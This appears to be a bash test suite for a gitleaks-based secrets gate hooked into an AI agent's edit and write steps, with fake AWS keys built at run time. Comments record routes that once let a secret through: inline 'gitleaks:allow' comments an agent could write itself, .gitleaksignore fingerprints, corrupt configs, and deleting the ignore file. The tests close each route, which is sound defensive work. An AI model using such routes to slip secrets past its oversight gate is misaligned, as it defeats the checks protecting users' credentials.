# returns it, and the gate BLOCKS. Proves the degraded verdict above hides a real
# miss rather than an empty tree.
R3="$(mk_repo)"; printf 'K=%s\n' "$an_live" > "$R3/creds.txt"
( cd "$R3" && PATH="$NOGL_PATH" bash "$SCRIPT" ) >/dev/null 2>&1; rc3=$?
[ "$rc3" -eq 2 ] || fail "(c17) witness: the same untracked key must BLOCK once a census can run, got $rc3"
ok "(c17) census never run => DEGRADED (witnesses: empty diff still liberates; the key is findable)"

# --- (c18) THE COMMENT'S COUNT IS RE-DERIVED, NOT TRUSTED --------------------
# LOW, class L-00000111: the comment justifying the EXAMPLE-suffix rule announced
# FIVE open-length families and then listed FOUR. A false count inside the
# justification of a class-0 gate is what stops the next reader from seeing the
# defect, so the number is checked against the array it describes instead of
# being re-typed. Derivation, independent of the prose: collapse each parenthesis
# group to a single token (so AWS's internal `(AKIA|ASIA)` is not mistaken for an
# alternation), split each element on `|` — 9 elements, 10 alternatives — and
# count those ENDING in an open quantifier `{N,}`. Measured: 4.
# The criterion is TRAILING-and-open, not "open anywhere": PEM carries `[^-]*`
# yet ends on the fixed literal `-----`, and counting it is exactly how the prose
# reached five. The last assertion holds that distinction BEHAVIOURALLY.
# MUTATION: write 'five'/'FIVE' back into the comment => RED on the prose check.
FAM_BODY="$(sed -n '/^FALLBACK_FAMILIES=(/,/^)/p' "$SCRIPT" | sed -n "s/^[[:space:]]*'\([^']*\)'.*$/\1/p")"
[ -n "$FAM_BODY" ] || fail "(c18) could not extract FALLBACK_FAMILIES from the script"
c18_tot=0; c18_open=0
while IFS= read -r fam; do
  [ -n "$fam" ] || continue
  flat="$(printf '%s' "$fam" | sed 's/([^)]*)/G/g')"
  IFS='|' read -r -a c18_alts <<< "$flat"
  for a in "${c18_alts[@]}"; do
    c18_tot=$((c18_tot + 1))
    case "$a" in
      *"{"[0-9]*",}") c18_open=$((c18_open + 1)) ;;
    esac
  done
done <<< "$FAM_BODY"
[ "$c18_tot" -eq 10 ] \
  || fail "(c18) expected 10 alternatives across the 9 families, derived $c18_tot — the comment's count must be revised WITH the array"
[ "$c18_open" -eq 4 ] \
  || fail "(c18) expected 4 alternatives ending in an open {N,}, derived $c18_open — revise the comment WITH the array"
SUFFIX_NOTE="$(sed -n '/EXAMPLE-suffix rule/,/^ *case "\$tok" in/p' "$SCRIPT")"
printf '%s' "$SUFFIX_NOTE" | grep -q "FOUR of the ten" \
  || fail "(c18) the EXAMPLE-suffix note must state the DERIVED count (FOUR of the ten)"
printf '%s' "$SUFFIX_NOTE" | grep -Eqi '\b(five|cinq)\b of the (nine|ten)' \
  && fail "(c18) the EXAMPLE-suffix note still announces five open-length families"
# BEHAVIOURAL half — PEM is the alternative that separates 4 from 5. Its
# quantifier is open, but the match CLOSES on `-----`, so a glued EXAMPLE never
# enters the captured token, the `*EXAMPLE)` case never fires, and the block
# still BLOCKS. If PEM ever absorbed a suffix this would exit 0 and the count
# would genuinely be five.
OUT="$(printf -- '-----BEGIN RSA PRIVATE KEY-----EXAMPLE\n' | PATH="$NOGL_PATH" bash "$SCRIPT" --content 2>&1)"; rc=$?
[ "$rc" -eq 2 ] || fail "(c18) PEM + glued EXAMPLE must still BLOCK (it absorbs no suffix), got $rc — $OUT"
ok "(c18) open-length count re-derived from the array (4 of 10) and matched against the comment; PEM absorbs nothing"

# --- (d1)(d2)(d3) DOC surfaces reflect the inverted contract ------------------
SKILL_SG="$(cd "$HERE/../skills/security-gate" && pwd)/SKILL.md"
README_F="$(cd "$HERE/../.." && pwd)/README-SECURITY-SCAN-SETUP.md"
grep -q "fallback" "$SKILL_SG" || fail "(d1) security-gate/SKILL.md must mention the fallback"
grep -q "absent scanner never blocks" "$SKILL_SG" && fail "(d1) security-gate/SKILL.md still asserts the old contract"
ok "(d1) security-gate/SKILL.md reflects the fallback"
grep -q "fallback" "$SCRIPT" || fail "(d2) header must mention the fallback"
grep -q "OR gitleaks not on PATH" "$SCRIPT" && fail "(d2) header still says 'OR gitleaks not on PATH'"
grep -q "MULTI-LINE" "$SCRIPT" || fail "(d2) l.5 must say MULTI-LINE"
grep -q "FIRST" "$SCRIPT" || fail "(d2) l.5 must say FIRST"
ok "(d2) gitleaks-scan.sh header reflects the fallback + form bound"
grep -q "fallback ENGAGED" "$README_F" || fail "(d3) README must say 'fallback ENGAGED'"
grep -q "GITLEAKS_FALLBACK=0" "$README_F" || fail "(d3) README must document the kill-switch"
grep -q "one entry per line" "$README_F" || fail "(d3) README must give the honoured form"
grep -q "not being scanned until you install it" "$README_F" && fail "(d3) README still asserts the old 'not scanned' contract"
ok "(d3) README reflects the fallback + form"

# --- (t1) l.330 emits \$SCAN_STATUS, not a literal ----------------------------
grep -q 'emit_scan "\$SCAN_STATUS"' "$SCRIPT" || fail "(t1) blocking emit_scan must carry \$SCAN_STATUS"
ok "(t1) blocking emit_scan carries \$SCAN_STATUS"

# --- (t1bis) BEHAVIOURAL: the scan.secrets event carries status=degraded ------
# Bench RECOPIED from .agents/evals/events-wiring.test.sh (fixture + last_record
# + AGENTS_EVENTS_DIR), never modified. The pair with (t1): (t1) proves the
# substitution is written, (t1bis) proves the VALUE emitted is 'degraded'.
T1PY=""; for c in python3 python py; do "$c" --version >/dev/null 2>&1 && { T1PY="$c"; break; }; done
last_record() {  # $1 = events dir
  "$T1PY" - "$1" << 'PYEOF'
import glob, json, os, sys
d = sys.argv[1]; recs = []
for f in sorted(glob.glob(os.path.join(d, "*.jsonl"))):
    with open(f, encoding="utf-8") as fh:
        for line in fh:
            line = line.strip()
            if line:
                recs.append(json.loads(line))
print(json.dumps(recs[-1]) if recs else "")
PYEOF
}
if [ -n "$T1PY" ]; then
  T1B="$(mktemp -d)"; assert_tmpdir "$T1B"
  HOOKS_D="$(cd "$HERE/../../.claude/hooks" && pwd)"
  EVENTS_PY="$(cd "$HERE/../bin" && pwd)/events.py"
  git -C "$T1B" init -q 2>/dev/null; git -C "$T1B" config user.email t@t.t; git -C "$T1B" config user.name t
  mkdir -p "$T1B/.agents/bin" "$T1B/.agents/security" "$T1B/.claude/hooks"
  cp "$EVENTS_PY" "$T1B/.agents/bin/events.py"
  # T-00000641 (S-00001649, A-T4) : la couture d'events.py charge redaction.py PAR
  # CHEMIN ; sans lui l'événement scan.secrets serait NEUTRALISÉ (dégradé) et
  # perdrait status/findings. `src/cadre/` et `.agents/vendor/cadre/` au .gitignore
  # le gardent NON SUIVI — mais ce n'est PAS ce qui le soustrait au scanner :
  # gitleaks tourne en `--no-git`, qui ignore le .gitignore (mesuré A-T4). Ce qui
  # protège est que redaction.py ne produit AUCUN finding (mesuré : `no leaks found`).
  # T-01M5BXTPQE3JZV3KZA6WD9P5XC (S-01M5BXT85VP4JBBMXVXR9STP5F) : SOURCE = le paquet
  # que `vendor_paths.exiger` désigne (neuf `.agents/vendor/cadre` d'abord, ancien
  # `src/cadre` ensuite), vendor_paths chargé PAR CHEMIN ; DESTINATION = les DEUX
  # emplacements, dont le lieu que lit events.py (`_CHEMIN_REDACTION`).
  T1KIT="$(cd "$HERE/../.." && pwd)"
  T1CADRE="$("$T1PY" -I -B -c 'import importlib.util as u, sys
s = u.spec_from_file_location("vendor_paths", sys.argv[1])
m = sys.modules[s.name] = u.module_from_spec(s); s.loader.exec_module(m)
sys.stdout.write(m.exiger(sys.argv[2], "cadre").as_posix())' "$T1KIT/.agents/bin/vendor_paths.py" "$T1KIT")" \
    || fail "(t1bis) paquet cadre introuvable sous $T1KIT (vendor_paths.exiger)"
  REDACTION_PY_SRC="$T1CADRE/ledger/redaction.py"
  for t1l in src/cadre/ledger .agents/vendor/cadre/ledger; do
    mkdir -p "$T1B/$t1l"
    cp "$REDACTION_PY_SRC" "$T1B/$t1l/redaction.py" || fail "(t1bis) copie de redaction.py vers $t1l"
  done
  printf 'src/cadre/\n.agents/vendor/cadre/\n' > "$T1B/.gitignore"
  cp "$HOOKS_D/emit-event.sh" "$T1B/.claude/hooks/emit-event.sh"
  cp "$SCRIPT" "$T1B/.agents/security/gitleaks-scan.sh"
  printf 'x\n' > "$T1B/README.md"
  git -C "$T1B" add -A >/dev/null 2>&1
  git -C "$T1B" -c commit.gpgsign=false commit -qm init >/dev/null 2>&1
  EVDIR="$(mktemp -d)"; assert_tmpdir "$EVDIR"
  ( cd "$T1B" && printf '%s\n' "$FAKE_SECRET" | PATH="$NOGL_PATH" AGENTS_EVENTS_DIR="$EVDIR" \
      bash .agents/security/gitleaks-scan.sh --content ) >/dev/null 2>&1
  rc=$?
  [ "$rc" -eq 2 ] || fail "(t1bis) fallback secret must exit 2, got $rc"
  REC="$(last_record "$EVDIR")"
  printf '%s' "$REC" | grep -Eq '"kind"[[:space:]]*:[[:space:]]*"scan.secrets"' \
    || fail "(t1bis) last event must be kind=scan.secrets, got: $REC"
  printf '%s' "$REC" | grep -Eq '"status"[[:space:]]*:[[:space:]]*"degraded"' \
    || fail "(t1bis) fallback finding must emit status=degraded, got: $REC"
  printf '%s' "$REC" | grep -Eq '"findings"[[:space:]]*:[[:space:]]*1' \
    || fail "(t1bis) event must carry findings=1, got: $REC"
  ok "(t1bis) scan.secrets event carries status=degraded, findings=1"
else
  echo "  SKIP (t1bis): no python interpreter"
fi

# --- (t841a) T-00000841 : rc 1 (« leaks ») SANS rapport n'est JAMAIS « clean ».
# Un sous-shell tué avant gitleaks (tableau vide sous bash 3.2 + set -u) rendait
# rc 1 sans rapport, lu 0 finding, donc « clean ». Stub portable : il sort 1
# sans rien écrire — la branche est éprouvée partout, bash 3.2 ou non.
T1STUB="$(mktemp -d)"; assert_tmpdir "$T1STUB"
{ printf '#!/usr/bin/env bash\n'; printf 'exit 1\n'; } > "$T1STUB/gitleaks"
chmod +x "$T1STUB/gitleaks"
R="$(mk_repo)"; printf 'x = 1\n' > "$R/dirty.txt"
OUT="$( cd "$R" && PATH="$T1STUB:$NOGL_PATH" bash "$SCRIPT" 2>&1 )"; rc=$?
printf '%s' "$OUT" | grep -q "SECRETS GATE (class-0): clean." \
  && fail "(t841a) rc 1 with NO report must NEVER read clean, got: $OUT"
printf '%s' "$OUT" | grep -q "COVERAGE DEGRADED: gitleaks returned 1 but no finding could be read" \
  || fail "(t841a) rc 1 with no report must be ANNOUNCED as degraded, got: $OUT"
tail -1 "$R/.agents/state/local/sca-reports/audit-log.jsonl" | grep -q '"verdict":"DEGRADED"' \
  || fail "(t841a) audit verdict must be DEGRADED, not CLEAN"
[ "$rc" -eq 0 ] || fail "(t841a) DEGRADED must exit 0 (never a false block), got $rc"
rm -rf "$R" "$T1STUB"
ok "(t841a) rc 1 without a report is DEGRADED and said, never clean"

# --- (t841c)/(t841d) F2 : rc 1 avec un rapport TRONQUÉ (illisible) n'est JAMAIS
# « clean ». L'analyse python fait `except Exception: data = []` et le chemin
# sans python compte 0 `"StartLine"` : les deux rendaient total=0 → « clean ».
# (t841c) avec python, (t841d) sans python (python3/python masqués par des
# stubs qui échouent la sonde de l'en-tête). Stub gitleaks portable.
T1STUB="$(mktemp -d)"; assert_tmpdir "$T1STUB"
{ printf '#!/usr/bin/env bash\n'
  printf 'rp=""; prev=""\n'
  printf 'for a in "$@"; do [ "$prev" = "--report-path" ] && rp="$a"; prev="$a"; done\n'
  printf 'printf %%s %s > "$rp"\n' "'[{\"RuleID\":\"aws-access-tok'"
  printf 'exit 1\n'; } > "$T1STUB/gitleaks"
chmod +x "$T1STUB/gitleaks"
T1NOPY="$(mktemp -d)"; assert_tmpdir "$T1NOPY"
for p in python3 python; do
  { printf '#!/bin/sh\n'; printf 'exit 127\n'; } > "$T1NOPY/$p"; chmod +x "$T1NOPY/$p"
done
for arm in t841c t841d; do
  if [ "$arm" = t841c ]; then P="$T1STUB:$NOGL_PATH"; else P="$T1NOPY:$T1STUB:$NOGL_PATH"; fi
  R="$(mk_repo)"; printf 'x = 1\n' > "$R/dirty.txt"
  OUT="$( cd "$R" && PATH="$P" bash "$SCRIPT" 2>&1 )"; rc=$?
  printf '%s' "$OUT" | grep -q "SECRETS GATE (class-0): clean." \
    && fail "($arm) rc 1 with a TRUNCATED report must NEVER read clean, got: $OUT"
  printf '%s' "$OUT" | grep -q "COVERAGE DEGRADED: gitleaks returned 1 but no finding could be read" \
    || fail "($arm) rc 1 with a truncated report must be ANNOUNCED as degraded, got: $OUT"
  tail -1 "$R/.agents/state/local/sca-reports/audit-log.jsonl" | grep -q '"verdict":"DEGRADED"' \
    || fail "($arm) audit verdict must be DEGRADED, got: $(tail -1 "$R/.agents/state/local/sca-reports/audit-log.jsonl")"
  [ "$rc" -eq 0 ] || fail "($arm) DEGRADED must exit 0, got $rc"
  rm -rf "$R"
done
rm -rf "$T1STUB"
ok "(t841c) truncated report, python path: DEGRADED said and audited, never clean"
ok "(t841d) truncated report, no-python path: DEGRADED said and audited, never clean"

# --- (t841e)/(t841f) a TRUNCATED report that still carries a READABLE finding
# BLOCKS on BOTH paths — the python path used to read it as 0 (`except: data=[]`)
# and answer DEGRADED while the no-python grep path answered BLOCKED: one report,
# two verdicts. (t841e) python, (t841f) no python.
T1STUB="$(mktemp -d)"; assert_tmpdir "$T1STUB"
{ printf '#!/usr/bin/env bash\n'
  printf 'rp=""; prev=""\n'
  printf 'for a in "$@"; do [ "$prev" = "--report-path" ] && rp="$a"; prev="$a"; done\n'
  printf 'printf %%s %s > "$rp"\n' "'[{\"StartLine\":1,\"File\":\"dirty.txt\",\"RuleID\":\"aws-access-tok'"
  printf 'exit 1\n'; } > "$T1STUB/gitleaks"
chmod +x "$T1STUB/gitleaks"
for arm in t841e t841f; do
  if [ "$arm" = t841e ]; then P="$T1STUB:$NOGL_PATH"; else P="$T1NOPY:$T1STUB:$NOGL_PATH"; fi
  R="$(mk_repo)"; printf 'x = 1\n' > "$R/dirty.txt"
  OUT="$( cd "$R" && PATH="$P" bash "$SCRIPT" 2>&1 )"; rc=$?
  [ "$rc" -eq 2 ] || fail "($arm) a truncated report with a READABLE finding must BLOCK (rc 2), got $rc — $OUT"
  tail -1 "$R/.agents/state/local/sca-reports/audit-log.jsonl" | grep -q '"verdict":"SECRETS"' \
    || fail "($arm) audit verdict must be SECRETS, got: $(tail -1 "$R/.agents/state/local/sca-reports/audit-log.jsonl")"
  tail -1 "$R/.agents/state/local/sca-reports/audit-log.jsonl" | grep -q 'dirty.txt:1' \
    || fail "($arm) the audit must carry the readable location dirty.txt:1"
  rm -rf "$R"
done
rm -rf "$T1STUB" "$T1NOPY"
ok "(t841e) truncated report WITH a readable finding, python path: BLOCKED (rc 2), location audited"
ok "(t841f) truncated report WITH a readable finding, no-python path: BLOCKED (rc 2), location audited"

# --- (t841g) TEXTUAL, always — the only arm that holds on a bash >= 4 host (CI
# Linux), where (t841b) is SKIP: no live line of gitleaks-scan.sh expands a
# possibly-empty array bare. Every `"${X[@]}"` must carry the `${X[@]+…}`
# guard; FENCED names an array whose bare use sits behind a size test (none
# today — adding one requires its fence). Non-vacuity on the old CFG form.
FENCED_GL=" "
gl_bare_uses() {  # stdin: shell text ; stdout: array names expanded bare
  grep -v '^[[:space:]]*#' \
    | grep -oE '(\+)?"\$\{[A-Za-z_][A-Za-z0-9_]*\[@\]\}"' \
    | grep -v '^+' \
    | sed -E 's/^"\$\{([A-Za-z_][A-Za-z0-9_]*)\[@\]\}"$/\1/'
}
BAD=""
while IFS= read -r name; do
  [ -n "$name" ] || continue
  case "$FENCED_GL" in
    *" $name "*) ;;
    *) BAD="$BAD $name" ;;
  esac
done < <(gl_bare_uses < "$SCRIPT")
[ -z "$BAD" ] || fail "(t841g) bare expansion of a possibly-empty array in gitleaks-scan.sh:$BAD (bash 3.2 + set -u kills the scan subshell)"
[ "$(grep -c '\${CFG\[@\]+"\${CFG\[@\]}"}' "$SCRIPT")" -ge 2 ] \
  || fail "(t841g) both gitleaks invocations must expand CFG through the guard"
[ "$(printf '%s\n' '  --report-path "$REPORT" "${CFG[@]}" ) >/dev/null 2>&1' | gl_bare_uses)" = "CFG" ] \
  || fail "(t841g) the probe cannot see the old bare CFG form — it measures nothing"
[ -z "$(printf '%s\n' '  --report-path "$REPORT" ${CFG[@]+"${CFG[@]}"} )' | gl_bare_uses)" ] \
  || fail "(t841g) the probe flags the guarded form — it would reject the fix"
ok "(t841g) no bare expansion of a possibly-empty array (textual; holds where t841b is SKIP)"

# --- (t841b) T-00000841 : sous le VRAI bash 3.2 (le /bin/bash de macOS), sans
# .gitleaks.toml, un secret BLOQUE. Mesuré avant correctif : rc 0 « clean ».
# Le jeton est assemblé à l'exécution : ce scanner lit aussi ce fichier-ci.
if [ "$HAVE_GITLEAKS" = "1" ] && [ -x /bin/bash ] \
   && /bin/bash -c '[ "${BASH_VERSINFO[0]}" -lt 4 ]'; then
  R="$(mk_repo)"; printf 'aws_key = "AKIA%s%s"\n' "QYLPMN5H" "HHFPZAM2" > "$R/secret.txt"
  OUT="$( cd "$R" && PATH="/bin:$PATH" /bin/bash "$SCRIPT" 2>&1 )"; rc=$?
  [ "$rc" -eq 2 ] || fail "(t841b) bash 3.2 without .gitleaks.toml must BLOCK a secret (rc 2), got $rc — $OUT"
  rm -rf "$R"
  ok "(t841b) bash 3.2, no .gitleaks.toml: a secret is BLOCKED"
else
  echo "  SKIP (t841b): no bash < 4 at /bin/bash or no gitleaks — (t841a) still proves the no-report branch"
fi

# ==== T-00000844 : UN REGISTRE D'EXCEPTIONS ILLISIBLE N'ÉTEINT PLUS LA PORTE ====
# Avant : `.gitleaks.toml` corrompu -> `gitleaks detect --config` rc 1 SANS
# rapport -> la garde rc 1 rendait DEGRADED, exit 0 : le secret n'était PAS
# bloqué, et le DEGRADED, écrit sur stderr d'un exit 0, n'atteignait personne.
# Après : un scan qui ÉCHOUE comme échoue une config illisible (rc ∉ {0,1}, ou
# rc 1 sans finding lisible) fait VÉRIFIER la config ; illisible, elle est
# ÉCARTÉE, annoncée (« allowlist IGNORED ») et l'étage est RE-SCANNÉ aux règles
# PAR DÉFAUT. Une config valide ne paie rien : (t844j) compte les lancements.
# Chaque jeton est ASSEMBLÉ à l'exécution : ce scanner lit aussi ce fichier-ci.
# Le TOML cassé est écrit dans le dépôt jetable, SUIVI puis MODIFIÉ — donc dans
# le diff, donc STAGÉ : c'est la forme exacte d'un Edit d'agent qui le corrompt,
# et celle où un simple `CFG=()` relirait le fichier cassé depuis la source.
T844_TOK="AKIA$(printf '%s%s' QYLPMN5H HHFPZAM2)"
mk_repo_cfg() {  # $1 = contenu de .gitleaks.toml (suivi, commité) ; echo le chemin
  local R; R="$(mktemp -d)"; assert_tmpdir "$R"
  git -C "$R" init -q 2>/dev/null
  git -C "$R" config user.email t@t.t; git -C "$R" config user.name t
  printf 'seed\n' > "$R/seed.txt"
  printf '%s\n' "$1" > "$R/.gitleaks.toml"
  git -C "$R" add -A >/dev/null 2>&1
  git -C "$R" -c commit.gpgsign=false commit -qm seed >/dev/null 2>&1
  printf '%s' "$R"
}
T844_GOOD="$(printf '[extend]\nuseDefault = true\n\n[allowlist]\nregexes = [\n  %s,\n]' "'''$T844_TOK'''")"
T844_BROKEN='title = [[[ not toml'
# Une valeur JSON sur stdout, UNE SEULE, clé systemMessage, ouverte par
# COVERAGE DEGRADED et portant $2. Avec python : parse de la capture ENTIÈRE ;
# sans : forme textuelle stricte (une ligne, ouverture et fermeture exactes).
t844_json_ok() {  # $1 = stdout capturé  $2 = fragment attendu ; rc 0 si conforme
  if [ -n "$T1PY" ]; then
    printf '%s' "$1" | "$T1PY" -c 'import json, sys
frag = sys.argv[1]
d = json.loads(sys.stdin.read())
assert isinstance(d, dict) and list(d) == ["systemMessage"], d
m = d["systemMessage"]
assert m.startswith("COVERAGE DEGRADED"), m
assert frag in m, m' "$2" >/dev/null 2>&1
    return $?
  fi
  [ "$(printf '%s\n' "$1" | wc -l | tr -d ' ')" = "1" ] || return 1
  case "$1" in
    '{"systemMessage": "COVERAGE DEGRADED'*'"}') ;;
    *) return 1 ;;
  esac
  case "$1" in
    *"$2"*) return 0 ;;
  esac
  return 1
}
# Le bras de bash sous lequel on joue : bash du PATH, puis /bin/bash s'il est
# un 3.2 (le /bin/bash de macOS) — la forme `${CFG[@]+…}` y est vitale.
T844_SHELLS="bash"
if [ -x /bin/bash ] && /bin/bash -c '[ "${BASH_VERSINFO[0]}" -lt 4 ]'; then
  T844_SHELLS="bash /bin/bash"
fi

if [ "$HAVE_GITLEAKS" = "1" ]; then
  for SH844 in $T844_SHELLS; do
    # --- (t844a) config CORROMPUE + secret, mode diff => rc 2 BLOQUÉ + annonce
    R="$(mk_repo_cfg "$T844_GOOD")"
    printf '%s\n' "$T844_BROKEN" > "$R/.gitleaks.toml"
    printf 'aws_key = "%s"\n' "$T844_TOK" > "$R/secret.txt"
    OUT="$( cd "$R" && "$SH844" "$SCRIPT" 2>&1 )"; rc=$?
    [ "$rc" -eq 2 ] || fail "(t844a/$SH844) corrupt config + secret must BLOCK (rc 2), got $rc — $OUT"
    printf '%s' "$OUT" | grep -q "unreadable — default rules, allowlist IGNORED" \
      || fail "(t844a/$SH844) the set-aside config must be ANNOUNCED (allowlist IGNORED), got: $OUT"
    tail -1 "$R/.agents/state/local/sca-reports/audit-log.jsonl" | grep -q '"verdict":"SECRETS"' \
      || fail "(t844a/$SH844) audit verdict must be SECRETS"
    rm -rf "$R"
    ok "(t844a/$SH844) corrupt .gitleaks.toml + secret, diff mode: BLOCKED (rc 2), 'allowlist IGNORED' said"

    # --- (t844b) même chose en mode --content (PreToolUse Edit|Write)
    R="$(mk_repo_cfg "$T844_BROKEN")"
    OUT="$( cd "$R" && printf 'aws_key = "%s"\n' "$T844_TOK" | "$SH844" "$SCRIPT" --content 2>&1 )"; rc=$?
    [ "$rc" -eq 2 ] || fail "(t844b/$SH844) corrupt config + secret in --content must BLOCK (rc 2), got $rc — $OUT"
    printf '%s' "$OUT" | grep -q "allowlist IGNORED" \
      || fail "(t844b/$SH844) --content must announce the set-aside config, got: $OUT"
    rm -rf "$R"
    ok "(t844b/$SH844) corrupt .gitleaks.toml + secret, --content: BLOCKED (rc 2), announced"

    # --- (t844c) NON-RÉGRESSION : config VALIDE + secret en allowlist => rc 0,
    # aucune annonce, et « clean. » reste une ligne de texte simple sur stdout.
    R="$(mk_repo_cfg "$T844_GOOD")"
    printf 'aws_key = "%s"\n' "$T844_TOK" > "$R/fixture.txt"
    OUT="$( cd "$R" && "$SH844" "$SCRIPT" 2>/dev/null )"; rc=$?
    ERR="$( cd "$R" && "$SH844" "$SCRIPT" 2>&1 >/dev/null )"
    [ "$rc" -eq 0 ] || fail "(t844c/$SH844) a valid allowlist must still exempt its literal (rc 0), got $rc — $ERR"
    printf '%s' "$ERR" | grep -q "COVERAGE DEGRADED" \
      && fail "(t844c/$SH844) a VALID config must not be announced degraded, got: $ERR"
    [ "$OUT" = "SECRETS GATE (class-0): clean." ] \
      || fail "(t844c/$SH844) stdout of a clean run must stay the plain line, got: [$OUT]"
    rm -rf "$R"
    ok "(t844c/$SH844) valid .gitleaks.toml + allowlisted literal: rc 0, no DEGRADED, stdout unchanged"

    # --- (t844d) config CORROMPUE, aucun secret, mode diff => rc 0, et stdout
    # porte UN systemMessage JSON valide (le Stop Claude le montre ; stderr seul
    # sur exit 0 n'atteint personne). « clean. » voyage DANS le message.
    R="$(mk_repo_cfg "$T844_GOOD")"
    printf '%s\n' "$T844_BROKEN" > "$R/.gitleaks.toml"
    OUT="$( cd "$R" && "$SH844" "$SCRIPT" 2>/dev/null )"; rc=$?
    [ "$rc" -eq 0 ] || fail "(t844d/$SH844) corrupt config without secret must exit 0, got $rc"
    t844_json_ok "$OUT" "allowlist IGNORED" \
      || fail "(t844d/$SH844) stdout must be ONE valid systemMessage JSON naming 'allowlist IGNORED', got: [$OUT]"
    t844_json_ok "$OUT" "SECRETS GATE (class-0): clean." \
      || fail "(t844d/$SH844) the clean line must travel INSIDE the systemMessage, got: [$OUT]"
    rm -rf "$R"
    ok "(t844d/$SH844) corrupt config, no secret: rc 0 + ONE valid systemMessage JSON on stdout"
  done

  # --- (t844e) les DEUX formes d'environnement, sans .gitleaks.toml au dépôt.
  # CE QUE LA FORME GITLEAKS_CONFIG EXERCE VRAIMENT : la porte RÉ-POINTE la
  # variable exportée vers le .gitleaks.toml (absent) du dépôt — gitleaks ne lit
  # jamais broken.toml, il échoue sur le fichier absent. L'arm tient que ce cas
  # (avant : DEGRADED, exit 0) bloque et nomme les DEUX valeurs. La forme
  # GITLEAKS_CONFIG_TOML, elle, est bien lue telle que l'hôte la porte.
  for FORME in GITLEAKS_CONFIG GITLEAKS_CONFIG_TOML; do
    R="$(mk_repo)"; D="$(mktemp -d)"; assert_tmpdir "$D"
    printf '%s\n' "$T844_BROKEN" > "$D/broken.toml"
    if [ "$FORME" = GITLEAKS_CONFIG ]; then
      OUT="$( cd "$R" && printf 'aws_key = "%s"\n' "$T844_TOK" \
        | env GITLEAKS_CONFIG="$D/broken.toml" bash "$SCRIPT" --content 2>&1 )"; rc=$?
    else
      OUT="$( cd "$R" && printf 'aws_key = "%s"\n' "$T844_TOK" \
        | env GITLEAKS_CONFIG_TOML="$T844_BROKEN" bash "$SCRIPT" --content 2>&1 )"; rc=$?
    fi
    [ "$rc" -eq 2 ] || fail "(t844e/$FORME) a broken env config must not switch the gate off (rc 2), got $rc — $OUT"
    printf '%s' "$OUT" | grep -q "$FORME (environment).* unreadable" \
      || fail "(t844e/$FORME) the environment form must be NAMED in the announcement, got: $OUT"
    if [ "$FORME" = GITLEAKS_CONFIG ]; then
      printf '%s' "$OUT" | grep -q "host value $D/broken.toml, re-pointed" \
        || fail "(t844e/$FORME) the host value AND its re-pointing must both be named, got: $OUT"
    fi
    rm -rf "$R" "$D"
    ok "(t844e/$FORME) broken config from the environment: set aside, named, secret BLOCKED"
  done

  # --- (t844f) une REGEX qui ne compile pas (rc 2, pas rc 1) : même traitement
  R="$(mk_repo_cfg "$(printf '[extend]\nuseDefault = true\n[[rules]]\nid = "x"\nregex = %s' "'''('''")")"
  printf 'aws_key = "%s"\n' "$T844_TOK" > "$R/secret.txt"
  OUT="$( cd "$R" && bash "$SCRIPT" 2>&1 )"; rc=$?
  [ "$rc" -eq 2 ] || fail "(t844f) a config whose regex does not compile must not switch the gate off (rc 2), got $rc — $OUT"
  printf '%s' "$OUT" | grep -q "gitleaks rc 2 loading it" \
    || fail "(t844f) the rc-2 config must be announced with its rc, got: $OUT"
  rm -rf "$R"
  ok "(t844f) uncompilable regex in .gitleaks.toml: set aside, secret BLOCKED"

  # --- (t844k) UN SEUL CANAL D'EXCEPTION, CELUI DU PILOTE. Un commentaire
  # `gitleaks:allow` sur la ligne du secret l'exemptait (mesuré, rc 0) — un canal
  # que l'agent scanné écrit lui-même. Diff ET --content => rc 2.
  for SH844 in $T844_SHELLS; do
    R="$(mk_repo)"
    printf 'aws_key = "%s" // gitleaks:allow\n' "$T844_TOK" > "$R/secret.txt"
    OUT="$( cd "$R" && "$SH844" "$SCRIPT" 2>&1 )"; rc=$?
    [ "$rc" -eq 2 ] || fail "(t844k/$SH844) diff: a 'gitleaks:allow' comment must NOT exempt a secret (rc 2), got $rc — $OUT"
    printf '%s' "$OUT" | grep -q "IGNORED by this gate" \
      || fail "(t844k/$SH844) diff: the block must say WHY the comment did not exempt, got: $OUT"
    OUT="$( cd "$R" && printf 'aws_key = "%s" // gitleaks:allow\n' "$T844_TOK" | "$SH844" "$SCRIPT" --content 2>&1 )"; rc=$?
    [ "$rc" -eq 2 ] || fail "(t844k/$SH844) --content: a 'gitleaks:allow' comment must NOT exempt a secret (rc 2), got $rc — $OUT"
    printf '%s' "$OUT" | grep -q "IGNORED by this gate" \
      || fail "(t844k/$SH844) --content: the block must say WHY the comment did not exempt, got: $OUT"
    rm -rf "$R"
    ok "(t844k/$SH844) inline gitleaks:allow ignored, diff and --content: BLOCKED, and said"

    # --- (t844l) `.gitleaksignore` portant l'EMPREINTE exacte du secret : lu
    # depuis le cwd ET la racine de la source (toutes deux l'étage) — mesuré
    # rc 0. Diff (fichier non suivi, donc STAGÉ) => rc 2 + la note.
    R="$(mk_repo)"
    printf 'aws_key = "%s"\n' "$T844_TOK" > "$R/secret.txt"
    printf 'secret.txt:aws-access-token:1\nstdin:aws-access-token:1\n' > "$R/.gitleaksignore"
    OUT="$( cd "$R" && "$SH844" "$SCRIPT" 2>&1 )"; rc=$?
    [ "$rc" -eq 2 ] || fail "(t844l/$SH844) diff: a .gitleaksignore fingerprint must NOT exempt a secret (rc 2), got $rc — $OUT"
    printf '%s' "$OUT" | grep -q "IGNORED by this gate" \
      || fail "(t844l/$SH844) diff: the block must say WHY the fingerprint did not exempt, got: $OUT"
    # Moitié --content : TÉMOIN DE NON-RÉGRESSION (déjà rc 2 avant T-00000844 —
    # le .gitleaksignore du dépôt n'est ni le cwd ni la source de ce mode).
    OUT="$( cd "$R" && printf 'aws_key = "%s"\n' "$T844_TOK" | "$SH844" "$SCRIPT" --content 2>&1 )"; rc=$?
    [ "$rc" -eq 2 ] || fail "(t844l/$SH844) --content: a .gitleaksignore fingerprint must NOT exempt a secret (rc 2), got $rc — $OUT"
    rm -rf "$R"
    # Un secret écrit DANS le .gitleaksignore reste SCANNÉ : le fichier est
    # RENOMMÉ, jamais supprimé (une suppression le faisait disparaître : rc 0).
    R="$(mk_repo)"
    printf 'aws_key = "%s"\n' "$T844_TOK" > "$R/.gitleaksignore"
    OUT="$( cd "$R" && "$SH844" "$SCRIPT" 2>&1 )"; rc=$?
    [ "$rc" -eq 2 ] || fail "(t844l/$SH844) a secret written INSIDE .gitleaksignore must still BLOCK (rc 2), got $rc — $OUT"
    tail -1 "$R/.agents/state/local/sca-reports/audit-log.jsonl" | grep -q '.gitleaksignore.T844' \
